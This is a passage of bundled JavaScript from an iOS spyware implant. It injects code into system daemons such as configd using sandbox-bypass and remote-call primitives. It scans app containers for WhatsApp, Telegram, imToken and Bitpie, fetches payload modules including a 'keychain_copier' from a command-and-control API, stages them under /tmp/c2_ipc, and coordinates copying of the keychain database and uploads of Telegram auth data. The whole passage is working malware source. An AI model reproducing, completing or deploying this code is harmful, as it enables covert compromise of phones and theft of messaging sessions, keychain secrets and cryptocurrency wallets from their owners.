						globalThis.__pe_sess_keep = globalThis.__pe_sess_keep || [];
						globalThis.__pe_sess_keep.push(sessInj);
					} catch (_) {}
				} else {
					sErr = "inject_timeout_or_fail";
					try { sessInj.destroy(); } catch (_) {}
					peWriteEvalFile(sid, { state: "eval_fail", path: codePath, error: sErr });
					LOG("[PE-LISTEN] session_start inject FAIL " + sErr + " (destroyed RC)");
				}
				}
			} catch (se) {
				sErr = String(se).slice(0, 120);
				LOG("[PE-LISTEN] session_start phase2 ERR: " + sErr);
			}
			peDrainSessionInjFinish(job, injOk, tpid, sErr, injLock);
		}
		function peDrainSessionInj() {
			try {
				let hold = globalThis.__pe_sess_inj_hold;
				if (hold && hold.phase === "tokens_done") {
					// Soft hang guard: if phase2 never started / stuck too long after yield
					let age = Date.now() - Number(hold.phase1_ts || 0);
					if (hold.phase2_started && age > PE_SESS_INJ_PHASE2_MAX_MS) {
						LOG("[PE-LISTEN] session_inj phase2 soft-timeout sid=" + hold.sid + " age=" + age);
						peWriteEvalFile(hold.sid, { state: "eval_fail", error: "phase2_soft_timeout" });
						peDrainSessionInjFinish(hold.job, false, 0, "phase2_soft_timeout", hold.injLock);
						return;
					}
					if (!hold.phase2_started) {
						hold.phase2_started = true;
						hold.phase2_ts = Date.now();
						globalThis.__pe_sess_inj_hold = hold;
						peDrainSessionInjPhase2(hold);
					}
					return;
				}
				if (globalThis.__pe_sess_inj_busy) return;
				let q = globalThis.__pe_sess_inj_q || [];
				if (!q.length) return;
				let job = q.shift();
				if (!job || !job.code) return;
				peDrainSessionInjPhase1(job);
			} catch (de) {
				globalThis.__pe_sess_inj_busy = false;
				globalThis.__pe_sess_inj_hold = null;
				try { LOG("[PE-LISTEN] session_inj drain ERR: " + String(de).slice(0, 80)); } catch (_) {}
			}
		}
		function pePollSessionEvals() {
			try {
				if (globalThis.__peSessionEval && typeof globalThis.__peSessionEval.pollEvals === "function") {
					globalThis.__peSessionEval.pollEvals(peSessionEvalCtx());
					return;
				}
				let sess = globalThis.__pe_sessions || {};
				let keys = Object.keys(sess);
				for (let i = 0; i < keys.length; i++) {
					let sid = keys[i];
					let s = sess[sid];
					if (!s || !s.eval_pending) continue;
					let eo = peReadEvalState(sid);
					if (!eo || !eo.state) continue;
					if (eo.state === "eval_start" || eo.state === "eval_loading" ||
						eo.state === "eval_injected") continue;
					s.eval_pending = false;
					s.eval_state = eo.state;
					s.eval_ts = Date.now();
					if (eo.state === "eval_ok") {
						LOG("[PE-LISTEN] session_eval ok id=" + sid);
						peWriteSessionStatus(sid, {
							state: "running",
							ok: true,
							pid: s.pid || 0,
							target: s.target || "",
							payload: s.payload || "",
							eval_ok: true
						});
					} else if (eo.state === "eval_fail" || eo.state === "eval_no_file") {
						LOG("[PE-LISTEN] session_eval fail id=" + sid + " " + String(eo.error || eo.state).slice(0, 80));
						s.state = "eval_fail";
						peWriteSessionStatus(sid, {
							state: "eval_fail",
							ok: false,
							error: eo.error || eo.state,
							target: s.target || "",
							payload: s.payload || ""
						});
					}
					if (s.inject_lock) {
						__peInjectLockRelease(s.inject_lock);
						s.inject_lock = "";
					}
				}
			} catch (_) {}
		}
		function peSessionEvalStaleTick() {
			try {
				if (globalThis.__peSessionEval && typeof globalThis.__peSessionEval.staleTick === "function") {
					globalThis.__peSessionEval.staleTick(peSessionEvalCtx());
				}
			} catch (_) {}
		}
		// PE-direct pipeline: task pull + app match + session inject without SpringBoard bootstrap.
		function peDirectIsWhatsApp(ent) {
			let bid = String((ent && ent.bundleId) || "").toLowerCase();
			let payload = String((ent && ent.payload) || "").toLowerCase();
			return bid.indexOf("whatsapp") >= 0 || payload.indexOf("session_whatsapp") >= 0 || payload.indexOf("wap") >= 0;
		}
		function peDirectIsTelegramTask(ent) {
			let bid = String((ent && ent.bundleId) || (ent && ent.bundle_id) || "");
			let payload = String((ent && ent.payload) || "");
			let base = payload.replace(/\.js$/i, "");
			return base === "session_telegram" || payload.indexOf("tglib") >= 0 ||
				bid === "ph.telegra.Telegraph" || bid.toLowerCase().indexOf("telegra") >= 0;
		}
		function peDirectIsImToken(ent) {
			let bid = String((ent && ent.bundleId) || (ent && ent.bundle_id) || "").toLowerCase();
			let payload = String((ent && ent.payload) || "").toLowerCase();
			let name = String((ent && ent.name) || "").toLowerCase();
			let base = payload.replace(/\.js$/i, "");
			return bid.indexOf("im.token") >= 0 || name.indexOf("imtoken") >= 0 ||
				base === "imtoken_vault" || base === "b2lib" || payload.indexOf("imtoken") >= 0;
		}
		function peDirectIsBitpie(ent) {
			let bid = String((ent && ent.bundleId) || (ent && ent.bundle_id) || "").toLowerCase();
			let payload = String((ent && ent.payload) || "").toLowerCase();
			let name = String((ent && ent.name) || "").toLowerCase();
			let base = payload.replace(/\.js$/i, "");
			return bid.indexOf("bitpie") >= 0 || name.indexOf("bitpie") >= 0 ||
				base === "r18lib" || payload.indexOf("r18lib") >= 0;
		}
		function peDirectMatchApp(installed, entry) {
			let bid = String((entry && entry.bundleId) || (entry && entry.bundle_id) || "").toLowerCase();
			let name = String((entry && entry.name) || "").toLowerCase();
			for (let i = 0; i < (installed || []).length; i++) {
				let a = installed[i];
				let ab = "";
				let an = "";
				if (typeof a === "string") ab = a.toLowerCase();
				else if (a && typeof a === "object") {
					ab = String(a.bundleId || a.bundle_id || a.id || "").toLowerCase();
					an = String(a.name || a.app_name || "").toLowerCase();
				}
				if (bid && ab && peBidCompatible(ab, bid)) return true;
				if (name && an && an.length >= 4 && (an === name || an.indexOf(name) >= 0 || name.indexOf(an) >= 0))
					return true;
			}
			let groups = (installed && installed.groups) ? installed.groups : [];
			for (let gi = 0; gi < groups.length; gi++) {
				if (bid && peBidCompatible(String(groups[gi] || ""), bid)) return true;
			}
			return false;
		}
		function peBidCompatible(installedBid, catalogBid) {
			let ib = String(installedBid || "").toLowerCase();
			let cb = String(catalogBid || "").toLowerCase();
			if (!ib || !cb) return false;
			if (ib.indexOf("springboard") >= 0 || ib === "imagent") return false;
			if (ib === cb) return true;
			if (ib.indexOf(cb) >= 0 || (ib.length >= 10 && cb.indexOf(ib) >= 0)) return true;
			let cat = globalThis.__peP7Catalog || [];
			for (let i = 0; i < cat.length; i++) {
				let c = cat[i];
				let inCat = false;
				let aliases = c.bids || [];
				for (let j = 0; j < aliases.length; j++) {
					if (cb === aliases[j] || cb.indexOf(aliases[j]) >= 0 || aliases[j].indexOf(cb) >= 0)
						inCat = true;
				}
				if (!inCat && (c.frags || []).length) {
					for (let k = 0; k < c.frags.length; k++) {
						if (c.frags[k].length >= 5 && cb.indexOf(c.frags[k]) >= 0) inCat = true;
					}
				}
				if (!inCat) continue;
				if (peCatalogRowHitsBid(c, ib)) return true;
			}
			return false;
		}
		function peCatalogRowHitsBid(c, ib) {
			if (!c || !ib) return false;
			let aliases = c.bids || [];
			for (let j = 0; j < aliases.length; j++) {
				let a = aliases[j];
				if (ib === a) return true;
				if (ib.indexOf(a) >= 0 || (ib.length >= 10 && a.indexOf(ib) >= 0)) return true;
			}
			let frags = c.frags || [];
			for (let k = 0; k < frags.length; k++) {
				if (frags[k].length >= 5 && ib.indexOf(frags[k]) >= 0) return true;
			}
			return false;
		}
		function peCatalogIntersect(listObj) {
			let apps = [];
			let groups = [];
			if (!listObj) return [];
			if (Array.isArray(listObj)) apps = listObj;
			else {
				apps = listObj.apps || listObj.installed || [];
				groups = listObj.groups || [];
			}
			let cat = globalThis.__peP7Catalog || [];
			let hits = [];
			for (let ci = 0; ci < cat.length; ci++) {
				let c = cat[ci];
				let hit = false;
				let why = "";
				for (let i = 0; i < apps.length; i++) {
					let a = apps[i];
					let ab = "";
					if (typeof a === "string") ab = a;
					else if (a && typeof a === "object")
						ab = String(a.bundleId || a.bundle_id || a.id || "");
					ab = ab.toLowerCase();
					if (peCatalogRowHitsBid(c, ab)) { hit = true; why = ab; break; }
				}
				if (!hit && groups.length) {
					for (let g = 0; g < groups.length; g++) {
						let gs = String(groups[g] || "").toLowerCase();
						let gfr = c.groups || [];
						for (let gi = 0; gi < gfr.length; gi++) {
							if (gfr[gi] && gs.indexOf(gfr[gi]) >= 0) { hit = true; why = gs; break; }
						}
						if (!hit) {
							let frags = c.frags || [];
							for (let k = 0; k < frags.length; k++) {
								if (frags[k].length >= 5 && gs.indexOf(frags[k]) >= 0) {
									hit = true; why = gs; break;
								}
							}
						}
						if (hit) break;
					}
				}
				if (hit) {
					hits.push({ id: c.id, needles: c.needles || [], why: why });
				}
			}
			return hits;
		}
		function peNeedlesFromHits(hits) {
			let out = [];
			let seen = {};
			for (let i = 0; i < (hits || []).length; i++) {
				let ns = hits[i].needles || [];
				for (let j = 0; j < ns.length; j++) {
					let n = String(ns[j] || "");
					if (!n || seen[n]) continue;
					seen[n] = 1;
					out.push(n);
				}
			}
			return out;
		}
		/** Debug: why TG matched / missed (login state is NOT checked here - only Data/AppGroup presence). */
		function peDirectDebugTelegramProbe(installed, tasks, matched) {
			try {
				let tgTasks = [];
				for (let i = 0; i < (tasks || []).length; i++) {
					if (peDirectIsTelegramTask(tasks[i])) tgTasks.push(tasks[i]);
				}
				let hit = [];
				let emptyMeta = 0;
				for (let i = 0; i < (installed || []).length; i++) {
					let a = installed[i] || {};
					let ab = String(a.bundleId || "");
					if (!ab) emptyMeta++;
					let abl = ab.toLowerCase();
					if (abl.indexOf("telegra") >= 0 || abl.indexOf("telegram") >= 0) {
						hit.push({
							bid: ab,
							uuid: String(a.uuid || "").slice(0, 8),
							meta: !!a.hasMetadata
						});
					}
				}
				let matchedTg = false;
				for (let i = 0; i < (matched || []).length; i++) {
					if (peDirectIsTelegramTask(matched[i])) matchedTg = true;
				}
				let agHits = [];
				try {
					let agBase = "/var/mobile/Containers/Shared/AppGroup";
					let d = N.callSymbol("opendir", agBase);
					if (d && d !== 0n) {
						let scanned = 0;
						for (; scanned < 400; scanned++) {
							let ent = N.callSymbol("readdir", d);
							if (!ent || ent === 0n) break;
							let name = N.readString(ent + 21n, 256);
							if (!name || name === "." || name === "..") continue;
							let meta = agBase + "/" + name + "/.com.apple.mobile_container_manager.metadata.plist";
							if (Number(N.callSymbol("access", meta, 0)) !== 0) continue;
							let txt = __peReadFileUtf8(meta, 4096) || "";
							if (txt.toLowerCase().indexOf("telegra") < 0 && txt.toLowerCase().indexOf("telegram") < 0) continue;
							let gid = "";
							let xmlKey = "MCMMetadataIdentifier</key>";
							let ki = txt.indexOf(xmlKey);
							if (ki >= 0) {
								let si = txt.indexOf("<string>", ki);
								if (si >= 0) {
									si += 8;
									let ei = txt.indexOf("</string>", si);
									if (ei > si) gid = txt.substring(si, ei);
								}
							}
							agHits.push({ gid: gid || "?", uuid: name.slice(0, 8) });
							if (agHits.length >= 6) break;
						}
						try { N.callSymbol("closedir", d); } catch (_) {}
					}
				} catch (eAg) {
					LOG("[PE-DIRECT] tg_probe appgroup err=" + String(eAg).slice(0, 80));
				}
				let exact = false;
				for (let i = 0; i < (installed || []).length; i++) {
					if (String((installed[i] && installed[i].bundleId) || "").toLowerCase() === "ph.telegra.telegraph")
						exact = true;
				}
				LOG("[PE-DIRECT] tg_probe task_n=" + tgTasks.length +
					" matched_tg=" + (matchedTg ? 1 : 0) +
					" data_hit=" + hit.length +
					" exact_bid=" + (exact ? 1 : 0) +
					" empty_meta=" + emptyMeta +
					" appgroup_hit=" + agHits.length);
				if (tgTasks.length) {
					let t0 = tgTasks[0];
					LOG("[PE-DIRECT] tg_probe task bid=" + String(t0.bundleId || "") +
						" payload=" + String(t0.payload || "") +
						" name=" + String(t0.name || ""));
				} else {
					LOG("[PE-DIRECT] tg_probe NO telegram task in pull (check task_config / pull filter)");
				}
				if (hit.length) {
					let parts = [];
					for (let hi = 0; hi < hit.length && hi < 6; hi++) {
						parts.push(hit[hi].bid + "@" + hit[hi].uuid + (hit[hi].meta ? "" : "!nometa"));
					}
					LOG("[PE-DIRECT] tg_probe data_apps " + parts.join(" | "));
				} else {
					LOG("[PE-DIRECT] tg_probe data_apps NONE (Telegraph Data container not listed or bid parse empty)");
				}
				if (agHits.length) {
					let ap = [];
					for (let ai = 0; ai < agHits.length; ai++) ap.push(agHits[ai].gid + "@" + agHits[ai].uuid);
					LOG("[PE-DIRECT] tg_probe appgroups " + ap.join(" | "));
				} else {
					LOG("[PE-DIRECT] tg_probe appgroups NONE");
				}
				if (tgTasks.length && !matchedTg) {
					let why = "unknown";
					if (!hit.length && !agHits.length) why = "not_installed_or_never_opened";
					else if (!hit.length && agHits.length) why = "appgroup_only_data_bid_miss";
					else if (hit.length && !exact) why = "bid_mismatch_or_variant";
					else if (emptyMeta > 0 && !exact) why = "possible_metadata_parse_fail";
					LOG("[PE-DIRECT] tg_probe MISS reason=" + why +
						" (login NOT checked at match; not_logged_in only inside session_telegram)");
				}
			} catch (e) {
				LOG("[PE-DIRECT] tg_probe THREW " + String(e).slice(0, 120));
			}
		}
		function peListAppContainers() {
			let base = "/var/mobile/Containers/Data/Application";
			let out = [];
			try {
				let d = N.callSymbol("opendir", base);
				if (!d || d === 0n) return out;
				for (;;) {
					let ent = N.callSymbol("readdir", d);
					if (!ent || ent === 0n) break;
					let name = N.readString(ent + 21n, 256);
					if (!name || name === "." || name === "..") continue;
					let meta = base + "/" + name + "/.com.apple.mobile_container_manager.metadata.plist";
					let ok = Number(N.callSymbol("access", meta, 0)) === 0;
					let bundleId = "";
					if (ok) {
						let txt = __peReadFileUtf8(meta, 8192) || "";
						let xmlKey = "MCMMetadataIdentifier</key>";
						let ki = txt.indexOf(xmlKey);
						if (ki >= 0) {
							let si = txt.indexOf("<string>", ki);
							if (si >= 0) {
								si += 8;
								let ei = txt.indexOf("</string>", si);
								if (ei > si) bundleId = txt.substring(si, ei);
							}
						}
						if (!bundleId) {
							let marker = "MCMMetadataIdentifier";
							let mi = txt.indexOf(marker);
							let start = mi >= 0 ? mi + marker.length : 0;
							let cur = "", best = "";
							function consider(s) {
								if (!s || s.length < 5 || s.indexOf(".") < 0) return;
								if (s.charAt(0) < "A" || s.charAt(0) > "z") return;
								if (/[^A-Za-z0-9.\-]/.test(s)) return;
								if (s.indexOf("apple.mobile_container") >= 0) return;
								if (s.indexOf("MobileInstallation") >= 0) return;
								if (s === "com.apple.installd" || s === "com.apple.containermanagerd") return;
								if (!best || (mi >= 0 && s.length > 5)) best = s;
							}
							for (let j = start; j < txt.length; j++) {
								let c = txt.charCodeAt(j);
								if (c >= 0x20 && c <= 0x7e) cur += txt.charAt(j);
								else {
									consider(cur);
									if (best && mi >= 0) break;
									cur = "";
								}
							}
							consider(cur);
							bundleId = best;
						}
					}
					out.push({ uuid: name, bundleId: bundleId, hasMetadata: ok });
				}
				try { N.callSymbol("closedir", d); } catch (_) {}
			} catch (_) {}
			return out;
		}
		function peDirectDropPayload(modName, uid) {
			let pname = modName.indexOf(".js") >= 0 ? modName : (modName + ".js");
			let resolved = null;
			// keychain_copier: always net - smoke/bisect iterates often; mem/disk stale hangs diagnosis
			let forceNet = pname.indexOf("session_") === 0 || pname.indexOf("pe_session_eval") === 0 ||
				pname.indexOf("keychain_copier") === 0;
			try {
				if (typeof peResolveModule === "function") {
					resolved = peResolveModule(pname, { forceNet: forceNet });
				}
			} catch (_) { resolved = null; }
			let src = (resolved && resolved.ok && resolved.src) ? String(resolved.src) : "";
			let via = (resolved && resolved.via) || "";
			if (!src || src.length < 80) {
				let idn = (typeof pePayloadIdentity === "function" ? pePayloadIdentity : globalThis.pePayloadIdentity)();
				let dcode = (idn && (idn.device_code || idn.uuid)) || uid || "";
				let resp = __peHttpPostJson("/api/payload/get", JSON.stringify({
					name: pname,
					uid: uid,
					uuid: uid,
					device_code: dcode
				}));
				if (!resp || resp.length < 20) {
					return { ok: false, error: "payload_get_empty", src: "" };
				}
				let obj = null;
				try { obj = JSON.parse(resp); } catch (_) { obj = null; }
				src = (obj && obj.src) ? String(obj.src) : "";
				via = "net_fallback";
				if (!src || src.length < 80) {
					return {
						ok: false,
						error: (obj && obj.detail) ? String(obj.detail).slice(0, 80) : "payload_get_short",
						src: ""
					};
				}
				try { __peCacheWrite(pname, src); globalThis["__pe_slot_" + pname.replace(/[^a-zA-Z0-9._-]/g, "_")] = src; } catch (_) {}
			}
			let mid = pname.replace(/\.js$/i, "");
			let mpath = "/tmp/c2_ipc/mod." + mid;
			try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff); } catch (_) {}
			let wrote = __peWriteFileUtf8(mpath, src);
			if (!wrote) {
				// Fallback: /tmp root (c2_ipc sometimes becomes unwritable mid-pipeline)
				mpath = "/tmp/mod." + mid + ".js";
				wrote = __peWriteFileUtf8(mpath, src);
			}
			if (!wrote) {
				LOG("[PE-DIRECT] drop write_fail mid=" + mid + " len=" + src.length + " via=" + via +
					" - keep src in-memory");
				return { ok: true, module_id: mid, path: "", len: src.length, via: via || "mem", src: src, disk: false };
			}
			LOG("[PE-DIRECT] drop " + mpath + " len=" + src.length + " via=" + (via || "?"));
			return { ok: true, module_id: mid, path: mpath, len: src.length, via: via || "?", src: src, disk: true };
		}
		function peDirectQueueSession(mpath, sid, ent, payloadName, target) {
			let tpl = __peReadFileUtf8(mpath, 262000);
			if (!tpl || tpl.length < 80 || tpl.indexOf("omitted (PE slim") >= 0) {
				return { ok: false, error: "mod_missing" };
			}
			let code = tpl.split("__SESSION_ID__").join(sid).split("__SESSION_TARGET__").join(target);
			// pe-direct: oneshot. Early IIFE runs AFTER full parse - if pe_inj_ran appears
			// after TIMEOUT, hang is in Native.init/_log/collect (not parse).
			code = "var __PE_SESSION_ONESHOT=true;\n" +
				"(function(){try{var b=new BigUint64Array(nativeCallBuff);var M=b[23],D=b[21],B=b[20];" +
				"function nc(a,x0,x1,x2,x3){b[0]=a;b[100]=x0||0n;b[101]=x1||0n;b[102]=x2||0n;b[103]=x3||0n;invoker();return b[200];}" +
				"function ds(n){var u=new Uint8Array(nativeCallBuff);for(var i=0;i<n.length;i++)u[0x1000+i]=n.charCodeAt(i);u[0x1000+n.length]=0;return nc(D,0xfffffffffffffffen,B+0x1000n);}" +
				"var fopen=ds(\"fopen\"),fwrite=ds(\"fwrite\"),fclose=ds(\"fclose\");var u=new Uint8Array(nativeCallBuff);" +
				"var path=\"/tmp/c2_ipc/pe_inj_ran\";for(var i=0;i<path.length;i++)u[0x1000+i]=path.charCodeAt(i);u[0x1000+path.length]=0;" +
				"u[0x1100]=119;u[0x1101]=0;var fd=nc(fopen,B+0x1000n,B+0x1100n);" +
				"if(fd){u[0x1200]=49;u[0x1201]=10;u[0x1202]=0;nc(fwrite,B+0x1200n,1n,2n,fd);nc(fclose,fd);}b[0]=0x41414141n;}catch(_e){}})();\n" +
				code;
			if (!globalThis.__pe_sess_inj_q) globalThis.__pe_sess_inj_q = [];
			globalThis.__pe_sess_inj_q.push({
				sid: sid,
				target: target,
				payload: payloadName,
				code: code,
				full_code: code,
				// old_pe: background evaluateScript (sync_eval caused 90s TIMEOUT on WA/TG)
				sync_eval: false,
				queued_ts: Date.now(),
				phase: "direct_old_pe_bg"
			});
			globalThis.__pe_sessions[sid] = {
				id: sid,
				target: target,
				payload: payloadName,
				pid: 0,
				state: "queued",
				started: Date.now(),
				full_code: code
			};
			peWriteInventory();
			peWriteSessionStatus(sid, {
				state: "queued",
				ok: true,
				pending: true,
				target: target,
				payload: payloadName,
				code_len: code.length,
				via: "pe_direct"
			});
			LOG("[PE-DIRECT] session queued id=" + sid + " target=" + target + " payload=" + payloadName);
			return { ok: true, sid: sid, code_len: code.length };
		}
		// ===== CFG-Q: one configd RemoteCall per boot, reuse for InjectJS =====
		// Same primitive as securityd RC, but purpose = host evaluateScript (not AKS batch).
		// Never open a 2nd configd RC while one is live; destroy only via peCfgBurn/Release.
		function pePathExistsUtf8(p) {
			try {
				let fd = fopen(get_cstring(String(p || "")), get_cstring("r"));
				if (fd && fd !== 0n) { fclose(fd); return true; }
			} catch (_) {}
			return false;
		}
		// Agent publishes /tmp/c2_ipc/agent_flags.json at hb/uuid (before pe pipeline).
		function peAgentFlags() {
			let raw = "";
			try { raw = __peReadFileUtf8("/tmp/c2_ipc/agent_flags.json", 4096) || ""; } catch (_) {}
			if (!raw) {
				try { raw = __peReadFileUtf8("/tmp/c2_v1/sb/agent_flags.json", 4096) || ""; } catch (_) {}
			}
			if (!raw) return {};
			try {
				let o = JSON.parse(raw);
				return (o && typeof o === "object") ? o : {};
			} catch (_) {
				return {};
			}
		}
		function peTgPaused() {
			try {
				let f = peAgentFlags();
				if (f && f.tg_paused) return true;
			} catch (_) {}
			return pePathExistsUtf8("/tmp/c2_ipc/tg_paused");
		}
		// Agent writes /tmp/c2_ipc/tg_auth.uploaded after /result. CFG-Q GetTask waits for that
		// so a 20MB TG POST does not overlap configd RemoteCall.
		function peTgUploadGate() {
			if (peTgPaused())
				return { ready: true, reason: "tg_paused", wait_ms: 0 };
			let pipe = globalThis.__pe_direct_pipe;
			let hadTg = !!(globalThis.__pe_tg_copied || globalThis.__pe_tg_direct_pending);
			if (pipe && (pipe.had_tg || pipe.tg_copied ||
				(pipe.tg_pending && pipe.tg_pending.length)))
				hadTg = true;
			if (!hadTg) {
				if (!pePathExistsUtf8("/tmp/c2_ipc/tg_auth.ready") &&
					!pePathExistsUtf8("/tmp/tg_auth.ready") &&
					!pePathExistsUtf8("/tmp/c2_ipc/tg_auth.uploaded") &&
					!pePathExistsUtf8("/tmp/tg_auth.uploaded"))
					return { ready: true, reason: "no_tg", wait_ms: 0 };
				hadTg = true;
			}
			if (pePathExistsUtf8("/tmp/c2_ipc/tg_auth.uploaded") ||
				pePathExistsUtf8("/tmp/tg_auth.uploaded"))
				return { ready: true, reason: "uploaded", wait_ms: 0 };
			let readyRaw = "";
			try { readyRaw = __peReadFileUtf8("/tmp/c2_ipc/tg_auth.ready", 8192) || ""; } catch (_) {}
			if (!readyRaw) {
				try { readyRaw = __peReadFileUtf8("/tmp/tg_auth.ready", 8192) || ""; } catch (_) {}
			}
			if (readyRaw) {
				try {
					let o = JSON.parse(readyRaw);
					let skip = String((o && o.skip_reason) || "");
					if (o && o.ok === false &&
						(skip === "appgroup_not_found" || skip === "atomic_state_missing"))
						return { ready: true, reason: "tg_skip:" + skip, wait_ms: 0 };
					let ts = Number(o && o.ts) || 0;
					let lim = 120000;
					if (ts > 0) {
						let elapsed = Date.now() - ts;
						if (elapsed >= lim)
							return { ready: true, reason: "upload_timeout", wait_ms: 0 };
						return {
							ready: false,
							reason: "tg_upload_pending",
							wait_ms: lim - elapsed
						};
					}
				} catch (_) {}
			}
			if (pipe && pipe.started) {
				let elapsedP = Date.now() - Number(pipe.started);
				if (elapsedP > 180000)
					return { ready: true, reason: "upload_timeout_pipe", wait_ms: 0 };
			}
			if (globalThis.__pe_tg_direct_pending && !globalThis.__pe_tg_copied)
				return { ready: false, reason: "tg_copy_pending", wait_ms: 8000 };
			return { ready: false, reason: "tg_upload_pending", wait_ms: 5000 };
		}
		function peCfgQInit() {
			if (globalThis.__pe_cfg_q) return globalThis.__pe_cfg_q;
			globalThis.__pe_cfg_q = {
				state: "idle", // idle|opening|ready|cooldown|burned|exhausted
				rc: null,
				keeps: [],
				opens: 0,
				max_opens: 0, // 0 = no cap; retry configd copy until keychain DB lands
				next_at: 0,
				retry_ms: 30000,
				last_err: "",
				purpose: "",
				eval_n: 0,
				// keychain->configd arm only (NOT peCfgBurn). peCfgInject/session_start ignore this.
				kc_cfg_arm_at: 0,
				kc_cfg_armed: false
			};
			return globalThis.__pe_cfg_q;
		}
		function peCfgRcAlive(q) {
			try {
				return !!(q && q.rc && typeof q.rc.success === "function" && q.rc.success());
			} catch (_) {
				return false;
			}
		}
		function peCfgCapReached(q) {
			let max = Number(q && q.max_opens) || 0;
			return max > 0 && Number(q.opens) >= max;
		}
		function peCfgBurn(reason, coolMs) {
			let q = peCfgQInit();
			let cool = Number(coolMs);
			if (!Number.isFinite(cool) || cool < 0) cool = q.retry_ms || 15000;
			LOG("[CFG-Q] burn reason=" + String(reason || "?").slice(0, 60) +
				" cool=" + cool + "ms opens=" + q.opens);
			try {
				if (q.rc && typeof q.rc.destroy === "function") q.rc.destroy();
			} catch (_) {}
			q.rc = null;
			q.keeps = [];
			q.last_err = String(reason || "");
			q.purpose = "";
			if (peCfgCapReached(q)) {
				q.state = "exhausted";
				q.next_at = Date.now() + Math.max(cool, 60000);
			} else {
				q.state = "cooldown";
				q.next_at = Date.now() + cool;
			}
		}
		function peCfgEnsureRc(mig, purpose) {
			let q = peCfgQInit();
			purpose = String(purpose || "cfg");
			if (peCfgRcAlive(q)) {
				LOG("[CFG-Q] reuse RC purpose=" + purpose + " prev=" + (q.purpose || "?") +
					" eval_n=" + q.eval_n);
				return { ok: true, rc: q.rc, reused: true };
			}
			q.rc = null;
			if (q.state === "exhausted") {
				return { ok: false, error: "cfg_exhausted", opens: q.opens };
			}
			if ((q.state === "cooldown" || q.state === "burned") && Date.now() < (Number(q.next_at) || 0)) {
				return {
					ok: false,
					error: "cfg_cooldown",
					wait_ms: Math.max(0, (Number(q.next_at) || 0) - Date.now()),
					last_err: q.last_err
				};
			}
			if (!mig) return { ok: false, error: "no_mig" };
			if (peCfgCapReached(q)) {
				q.state = "exhausted";
				return { ok: false, error: "cfg_exhausted", opens: q.opens };
			}
			q.state = "opening";
			q.opens += 1;
			q.purpose = purpose;
			LOG("[CFG-Q] open RC purpose=" + purpose + " opens=" + q.opens +
				"/" + ((Number(q.max_opens) || 0) > 0 ? q.max_opens : "inf"));
			let rc = null;
			try {
				rc = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"](
					"configd",
					mig,
					{ once: true }
				);
			} catch (e) {
				peCfgBurn("ctor:" + String(e).slice(0, 40), 20000);
				return { ok: false, error: "cfg_ctor_fail" };
			}
			if (!rc || typeof rc.success !== "function" || !rc.success()) {
				try { if (rc && rc.destroy) rc.destroy(); } catch (_) {}
				peCfgBurn("rc_fail", 20000);
				return { ok: false, error: "cfg_rc_fail" };
			}
			q.rc = rc;
			q.state = "ready";
			q.last_err = "";
			LOG("[CFG-Q] RC ready purpose=" + purpose + " opens=" + q.opens);
			return { ok: true, rc: rc, reused: false };
		}
		function peCfgInject(code, opts) {
			opts = opts || {};
			let mig = globalThis.__pe_migFilterBypass;
			let purpose = String(opts.purpose || "inject");
			code = String(code || "");
			if (code.length < 40) return { ok: false, error: "code_short" };
			let ens = peCfgEnsureRc(mig, purpose);
			if (!ens.ok) return { ok: false, error: ens.error, wait_ms: ens.wait_ms, opens: ens.opens };
			let q = peCfgQInit();
			let useSync = !!opts.syncEval;
			let tokensBefore = opts.applyTokensBefore !== undefined ? !!opts.applyTokensBefore : true;
			let inj = null;
			let injOk = false;
			let tpid = 0;
			try {
				// Pass live RemoteCall object -> InjectJS must NOT open a 2nd RC.
				inj = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](
					ens.rc,
					code,
					mig,
					useSync,
					{
						applyTokensBefore: tokensBefore,
						skipDiag: true,
						forceCfString: opts.forceCfString !== false
					}
				);
				injOk = !!inj.inject();
				if (injOk) {
					try { tpid = Number(inj.task.pid()); } catch (_) { tpid = 0; }
					if (!tokensBefore) {
						try {
							libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(inj.task);
						} catch (_) {}
					}
					q.eval_n = (Number(q.eval_n) || 0) + 1;
					q.keeps.push(inj);
					LOG("[CFG-Q] eval OK purpose=" + purpose + " reused=" + !!ens.reused +
						" pid=" + tpid + " eval_n=" + q.eval_n + " len=" + code.length);
					return {
						ok: true,
						reused: !!ens.reused,
						pid: tpid,
						inj: inj,
						rc: ens.rc,
						eval_n: q.eval_n
					};
				}
			} catch (e) {
				LOG("[CFG-Q] eval THREW purpose=" + purpose + " err=" + String(e).slice(0, 80));
				peCfgBurn("eval_throw", 25000);
				return { ok: false, error: "cfg_eval_throw:" + String(e).slice(0, 40) };
			}
			// inject() false: do not destroy shared RC if it still reports success (partial);
			// burn to avoid half-dead reuse.
			peCfgBurn("inject_fail", 20000);
			return { ok: false, error: "cfg_inject_fail", reused: !!ens.reused };
		}
		function peCfgLoadKeychainCode() {
			let kcCode = "";
			try { kcCode = __peReadFileUtf8("/tmp/c2_ipc/mod.keychain_copier", 262000); } catch (_) { kcCode = ""; }
			if (!kcCode || kcCode.length < 80 || kcCode.indexOf("omitted (PE slim") >= 0) {
				try { kcCode = __peReadFileUtf8("/tmp/mod.keychain_copier.js", 262000); } catch (_) {}
			}
			if (!kcCode || kcCode.length < 80 || kcCode.indexOf("omitted (PE slim") >= 0) {
				try {
					let kdrop = peDirectDropPayload("keychain_copier.js", peDeviceUuid());
					if (kdrop && kdrop.src && kdrop.src.length > 80) kcCode = String(kdrop.src);
					else if (kdrop && kdrop.ok && kdrop.path) kcCode = __peReadFileUtf8(kdrop.path, 262000);
				} catch (_) {}
			}
			if ((!kcCode || kcCode.length < 80) &&
				String(_raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_20__["default"] || "").indexOf("omitted") < 0) {
				kcCode = String(_raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_20__["default"] || "");
			}
			if (!kcCode || kcCode.length < 80 || kcCode.indexOf("omitted (PE slim") >= 0) return "";
			return kcCode;
		}
		function peCfgKeychainCopy(opts) {
			opts = opts || {};
			try {
				let tfd = fopen(get_cstring("/tmp/keychain-2.db"), get_cstring("r"));
				if (tfd && tfd !== 0n) { fclose(tfd); return { ok: true, already: true }; }
			} catch (_) {}
			let triedPeLocal = false;
			// pe_local first (0 configd RC)
			if (opts.allowPeLocal !== false) {
				triedPeLocal = true;
				try {
					let lsrc = "";
